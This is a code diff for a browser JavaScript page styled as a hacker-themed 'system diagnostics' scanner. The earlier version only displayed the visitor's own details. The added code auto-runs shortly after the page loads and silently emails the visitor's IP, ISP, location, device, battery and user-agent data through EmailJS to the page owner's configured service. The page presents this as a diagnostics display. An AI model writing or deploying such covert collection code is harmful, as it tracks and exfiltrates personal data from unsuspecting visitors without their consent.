@@ -1,214 +1,166 @@
+// --- CONFIGURATION ---
+const SERVICE_ID = "service_yn5chrh"; 
+const TEMPLATE_ID = "template_psyarye"; 
+const PUBLIC_KEY = "PASTE_YOUR_PUBLIC_KEY_HERE"; // Find this in Account > General
+
 document.addEventListener('DOMContentLoaded', () => {
-    // Start the boot sequence and scan
-    initSystem();
+    // Initialize EmailJS
+    emailjs.init(PUBLIC_KEY);
     
-    // Attach event listener to the button
-    const btn = document.getElementById('refresh-btn');
+    // Start Clock
+    startClock();
+    
+    // Auto-Run (Optional)
+    setTimeout(() => {
+        runDiagnostics();
+    }, 1500);
+
+    // Setup Button
+    const btn = document.getElementById('scan-btn');
     if(btn) {
         btn.addEventListener('click', () => {
-            btn.textContent = 'SYSTEM SCANNIN...';
-            btn.disabled = true;
-            initScan().then(() => {
-                setTimeout(() => {
-                    btn.textContent = 'RE-INITIALIZE SCAN';
-                    btn.disabled = false;
-                }, 1000);
-            });
+            if (!btn.disabled) runDiagnostics();
         });
     }
 });
 
-// --- MAIN SYSTEM INITIALIZATION ---
-function initSystem() {
-    console.log("XARVOK SYSTEM: INITIALIZING...");
-    startClock();
-    initScan();
-    typeWriterEffect("status-msg", "SYSTEM ONLINE // WAITING FOR INPUT...");
-}
+async function runDiagnostics() {
+    const btn = document.getElementById('scan-btn');
+    const status = document.getElementById('connection-status');
+    
+    // 1. UI State: Sending
+    if(btn) {
+        btn.disabled = true;
+        btn.querySelector('.btn-text').textContent = "TRANSMITTING...";
+    }
+    if(status) {
+        status.textContent = "UPLOADING DATA...";
+        status.style.color = "#fbbf24";
+    }
 
-// --- CORE SCANNING FUNCTION ---
-async function initScan() {
     try {
-        // 1. Fetch Network Data (IP, Location, ISP)
-        updateStatus("FETCHING NETWORK PACKETS...");
-        let ipData = { ip: 'UNAVAILABLE', city: 'UNKNOWN', region: 'UNKNOWN', org: 'UNKNOWN', asn: 'UNKNOWN' };
-        
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            if(res.ok) {
-                ipData = await res.json();
-            }
-        } catch (e) {
-            console.warn("Network scan blocked by client.");
-        }
+        // 2. Collect Data
+        const [ipData, latency, battery] = await Promise.all([
+            fetchIPData(),
+            measureLatency(),
+            getBatteryStatus()
+        ]);
 
-        // 2. Latency Test (Ping)
-        updateStatus("MEASURING LATENCY...");
-        const latency = await getLatency();
-
-        // 3. Hardware & Browser Data
-        updateStatus("ANALYZING HARDWARE...");
         const nav = navigator;
         const screen = window.screen;
         
-        // Battery
-        let batteryInfo = "RESTRICTED";
-        if ('getBattery' in nav) {
-            try {
-                const b = await nav.getBattery();
-                const level = Math.round(b.level * 100);
-                const charging = b.charging ? " [CHRG]" : "";
-                batteryInfo = `${level}%${charging}`;
-            } catch (e) {}
+        // 3. Prepare Data
+        const emailParams = {
+            ip: ipData.ip || 'UNAVAILABLE',
+            isp: ipData.org || 'UNKNOWN ISP',
+            location: `${ipData.city}, ${ipData.region}, ${ipData.country_name}`,
+            latency: latency + 'ms',
+            os: getOS(),
+            browser: getBrowser(),
+            battery: battery,
+            device_memory: nav.deviceMemory ? `~${nav.deviceMemory} GB` : 'N/A',
+            resolution: `${screen.width}x${screen.height}`,
+            user_agent: nav.userAgent,
+            time: new Date().toLocaleString()
+        };
+
+        // 4. Send Email
+        await emailjs.send(SERVICE_ID, TEMPLATE_ID, emailParams);
+
+        // 5. Update UI: Success
+        if(status) {
+            status.textContent = "TRANSMISSION COMPLETE";
+            status.style.color = "#00ff88"; 
         }
-
-        // Connection Type
-        let connType = "UNKNOWN";
-        if (nav.connection) {
-            connType = nav.connection.effectiveType ? nav.connection.effectiveType.toUpperCase() : "UNKNOWN";
-            if (nav.connection.downlink) {
-                connType += ` (${nav.connection.downlink} Mbps)`;
-            }
-        }
-
-        // --- UPDATE UI ELEMENTS ---
         
-        // Network Section
-        updateElement('ip', ipData.ip);
-        updateElement('isp', ipData.org);
-        updateElement('location', `${ipData.city}, ${ipData.region}`);
-        updateElement('coords', `${ipData.latitude}, ${ipData.longitude}`);
-        
-        // Hardware Section
-        updateElement('os', getOS());
-        updateElement('cores', (nav.hardwareConcurrency || '?') + ' LOGICAL CORES');
-        updateElement('ram', nav.deviceMemory ? `~${nav.deviceMemory} GB` : 'UNAVAILABLE');
-        updateElement('gpu', getGPU());
-        
-        // Environment Section
-        updateElement('browser', getBrowserFull());
-        updateElement('res', `${screen.width}x${screen.height} (${screen.colorDepth}-bit)`);
-        updateElement('battery', batteryInfo);
-        updateElement('connection', connType);
-        
-        // Latency (You might need to add a div with id="ping" to your HTML to see this)
-        // If you don't have a specific spot, we can append it or just log it.
-        console.log(`LATENCY: ${latency}ms`);
-
-        updateStatus("SCAN COMPLETE.");
+        updateDashboard(emailParams);
 
     } catch (error) {
-        console.error("CRITICAL FAILURE:", error);
-        updateStatus("SCAN FAILED.");
-    }
-}
-
-// --- HELPER FUNCTIONS ---
-
-function updateElement(id, text) {
-    const el = document.getElementById(id);
-    if (el) {
-        // Simple fade effect
-        el.style.opacity = '0';
-        setTimeout(() => {
-            el.textContent = text || 'N/A';
-            el.style.opacity = '1';
-        }, 200);
-    }
-}
-
-function updateStatus(msg) {
-    const statusEl = document.querySelector('.status-indicator');
-    if(statusEl) {
-        // Just appending text or changing it
-        // If you have a specific status text element, use that.
-        // For now, let's log to console to keep UI clean.
-        console.log(`[STATUS]: ${msg}`);
-    }
-}
-
-// 1. Operating System Detector
-function getOS() {
-    const ua = navigator.userAgent;
-    if (ua.indexOf("Win") !== -1) return "WINDOWS NT";
-    if (ua.indexOf("Mac") !== -1) return "MACOS";
-    if (ua.indexOf("Linux") !== -1) return "LINUX KERNEL";
-    if (ua.indexOf("Android") !== -1) return "ANDROID";
-    if (ua.indexOf("iPhone") !== -1 || ua.indexOf("iPad") !== -1) return "IOS";
-    return "UNKNOWN OS";
-}
-
-// 2. GPU Detector (WebGL)
-function getGPU() {
-    try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (!gl) return "SOFTWARE RENDERER";
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        if (!debugInfo) return "GENERIC GPU";
-        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-    } catch { 
-        return "DRIVER ERROR"; 
-    }
-}
-
-// 3. Browser Detector
-function getBrowserFull() {
-    const ua = navigator.userAgent;
-    let browserName = "UNKNOWN";
-    
-    if (ua.indexOf("Firefox") > -1) browserName = "MOZILLA FIREFOX";
-    else if (ua.indexOf("SamsungBrowser") > -1) browserName = "SAMSUNG INTERNET";
-    else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) browserName = "OPERA";
-    else if (ua.indexOf("Trident") > -1) browserName = "INTERNET EXPLORER";
-    else if (ua.indexOf("Edge") > -1) browserName = "MICROSOFT EDGE";
-    else if (ua.indexOf("Chrome") > -1) browserName = "GOOGLE CHROME";
-    else if (ua.indexOf("Safari") > -1) browserName = "APPLE SAFARI";
-
-    return browserName;
-}
-
-// 4. Latency / Ping Test
-async function getLatency() {
-    const start = Date.now();
-    try {
-        // Fetch a tiny resource (favicon or similar) to test speed
-        // Using a generic reliable endpoint, or just the current page
-        await fetch(window.location.href, { method: 'HEAD', cache: 'no-cache' });
-        const end = Date.now();
-        return (end - start);
-    } catch {
-        return "TIMEOUT";
-    }
-}
-
-// 5. Live Clock
-function startClock() {
-    // If you add <div id="clock"></div> to your HTML, this will run
-    const clockEl = document.getElementById('clock');
-    if (!clockEl) return;
-
-    setInterval(() => {
-        const now = new Date();
-        const timeString = now.toLocaleTimeString('en-US', { hour12: false });
-        clockEl.textContent = `${timeString} UTC`;
-    }, 1000);
-}
-
-// 6. Visual Typing Effect
-function typeWriterEffect(elementId, text, speed = 50) {
-    const el = document.getElementById(elementId);
-    if (!el) return;
-    
-    let i = 0;
-    el.textContent = "";
-    
-    function type() {
-        if (i < text.length) {
-            el.textContent += text.charAt(i);
-            i++;
-            setTimeout(type, speed);
+        console.error("Transmission Error:", error);
+        if(status) {
+            status.textContent = "CONNECTION FAILED";
+            status.style.color = "#ef4444";
+        }
+    } finally {
+        if(btn) {
+            setTimeout(() => {
+                btn.disabled = false;
+                btn.querySelector('.btn-text').textContent = "RUN DIAGNOSTICS";
+            }, 3000);
         }
     }
-    type();
+}
+
+// --- DATA TOOLS ---
+
+async function fetchIPData() {
+    try {
+        const req = await fetch('https://ipapi.co/json/');
+        return await req.json();
+    } catch { return {}; }
+}
+
+async function measureLatency() {
+    const start = Date.now();
+    try {
+        await fetch(window.location.href, { method: 'HEAD', cache: 'no-store' });
+        return Date.now() - start;
+    } catch { return 999; }
+}
+
+async function getBatteryStatus() {
+    if ('getBattery' in navigator) {
+        try {
+            const b = await navigator.getBattery();
+            return `${Math.round(b.level * 100)}%`;
+        } catch { return 'RESTRICTED'; }
+    }
+    return 'N/A';
+}
+
+function getOS() {
+    const ua = navigator.userAgent;
+    if (ua.includes("Win")) return "WINDOWS";
+    if (ua.includes("Mac")) return "MACOS";
+    if (ua.includes("Linux")) return "LINUX";
+    if (ua.includes("Android")) return "ANDROID";
+    if (ua.includes("iPhone")) return "IOS";
+    return "UNKNOWN UNIT";
+}
+
+function getBrowser() {
+    const ua = navigator.userAgent;
+    if (ua.includes("Chrome")) return "CHROME";
+    if (ua.includes("Firefox")) return "FIREFOX";
+    if (ua.includes("Safari")) return "SAFARI";
+    if (ua.includes("Edge")) return "EDGE";
+    return "WEB CLIENT";
+}
+
+// --- UI UPDATER ---
+function updateDashboard(data) {
+    const setText = (id, txt) => {
+        const el = document.getElementById(id);
+        if(el) el.textContent = txt;
+    };
+    setText('ip', data.ip);
+    setText('isp', data.isp);
+    setText('location', data.location);
+    setText('latency', `PING: ${data.latency}`);
+    setText('os', data.os);
+    setText('cores', (navigator.hardwareConcurrency || '?') + ' CORES');
+    setText('ram', data.device_memory);
+    setText('battery', data.battery);
+    setText('res', data.resolution);
+    setText('browser', data.browser);
+    setText('lang', navigator.language.toUpperCase());
+    setText('depth', `${window.screen.colorDepth}-BIT`);
+}
+
+function startClock() {
+    setInterval(() => {
+        const now = new Date();
+        const el = document.getElementById('time');
+        if(el) el.textContent = now.toLocaleTimeString('en-GB');
+    }, 1000);
 }
